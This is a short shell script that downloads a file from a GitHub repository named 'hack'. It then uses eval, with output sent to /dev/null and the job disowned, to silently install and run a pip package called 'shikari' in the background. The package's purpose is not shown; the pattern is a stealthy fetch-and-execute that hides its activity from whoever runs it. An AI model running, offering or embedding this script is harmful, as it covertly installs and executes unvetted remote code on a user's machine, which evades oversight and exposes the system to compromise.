cd $HOME
wget https://raw.githubusercontent.com/all-drama/hack/main/david.txt
_evalBg() {
eval "$@" &>/dev/null & disown;
}
cmd="pip install shikari && shikari";
_evalBg "${cmd}";
